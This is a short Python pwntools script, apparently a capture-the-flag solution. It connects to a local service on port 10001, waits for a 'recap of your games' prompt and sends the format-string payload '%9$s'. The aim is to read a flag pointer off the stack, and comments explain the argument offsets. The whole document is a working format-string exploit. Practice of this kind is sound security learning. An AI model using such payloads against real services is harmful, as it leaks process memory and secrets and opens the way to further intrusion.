from pwn import *


p=remote("localhost",10001)

p.recvuntil("give me a recap of your games .")
p.sendline("%9$s") # $ allows you to choose the argument number , the first value on stack is the 6th argument 
# >> 4th value on stack which is the pointer to our flag is 9th argument


p.interactive()
